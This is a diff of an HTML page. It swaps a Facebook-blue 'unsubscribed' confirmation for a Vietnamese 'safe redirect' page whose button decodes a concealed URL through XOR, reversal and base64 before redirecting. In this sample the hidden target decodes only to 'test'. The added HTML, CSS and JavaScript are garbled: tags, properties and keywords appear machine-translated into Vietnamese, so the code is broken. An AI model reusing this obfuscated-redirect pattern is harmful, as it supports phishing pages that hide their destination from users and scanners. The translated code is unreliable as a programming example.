@@ -1,62 +1,73 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<!DOCTYPEhtml>
+<html lang="vi">
+<đầu>
   <meta charset="UTF-8" />
-  <title>Unsubscribed Successfully</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    :root {
-      --primary-color: #1877f2; /* Facebook blue */
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Chuyển hướng an toàn</title>
+  <phong cách>
+    thân hình {
+      font-family: 'Helvetica Neue', sans-serif;
+      màu nền: #f0f2f5;
+      lề: 0;
+      đệm: 0;
+      hiển thị: flex;
+      căn chỉnh nội dung: ở giữa;
+      căn chỉnh các mục: ở giữa;
+      chiều cao: 100vh;
     }
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+    .hộp {
+      nền: trắng;
+      đệm: 2rem 3rem;
+      bán kính đường viền: 0,75rem;
+      hộp bóng: 0 4px 12px rgba(0, 0, 0, 0,1);
+      căn chỉnh văn bản: giữa;
+      chiều rộng tối đa: 400px;
+      chiều rộng: 100%;
     }
-    .container {
-      background: #fff;
-      padding: 40px 50px;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      max-width: 420px;
-      width: 90%;
+    .hộp h2 {
+      màu sắc: #1877f2;
+      lề dưới: 1rem;
     }
-    .icon {
-      font-size: 60px;
-      color: var(--primary-color);
-      margin-bottom: 20px;
+    .hộp p {
+      màu sắc: #555;
+      cỡ chữ: 0,95rem;
     }
-    h1 {
-      font-size: 24px;
-      color: var(--primary-color);
-      margin-bottom: 10px;
+    .btn {
+      lề trên: 1,5rem;
+      đệm: 0,8rem 2rem;
+      cỡ chữ: 1rem;
+      màu nền: #1877f2;
+      màu sắc: trắng;
+      đường viền: không có;
+      bán kính đường viền: 6px;
+      con trỏ: con trỏ;
+      font-weight: đậm;
     }
-    p {
-      font-size: 16px;
-      color: #444;
+    .btn:di chuột {
+      màu nền: #166fe5;
     }
-    .footer {
-      margin-top: 30px;
-      font-size: 13px;
-      color: #888;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="icon">✅</div>
-    <h1>You’ve Unsubscribed</h1>
-    <p>You have successfully unsubscribed from our email list.<br>
-    You will no longer receive further messages from us.</p>
-    <div class="footer">
-      © 2025. All rights reserved.
-    </div>
+  </phong cách>
+</đầu>
+<thân>
+  <div class="box">
+    Xác nhận chuyển hướng
+    <p>Vui lòng nhấp vào nút bên dưới để tiếp tục.</p>
+    <button class="btn" onclick="redirect()">Tiếp tục</button>
   </div>
+  <script>
+    const xorKey = 7;
+    liên kết được mã hóa hằng số = [58,58,70,99,125,81,64,99];
+
+    hàm decodeXOR(arr, key) {
+      trả về arr.map(c => String.fromCharCode(c ^ key)).join('');
+    }
+
+    hàm chuyển hướng() {
+      const xorDecoded = decodeXOR(encodedLink, xorKey);
+      const original = xorDecoded.split('').reverse().join('');
+      const url = atob(bản gốc);
+      window.location.href = url;
+    }
+  </script>
 </body>
 </html>
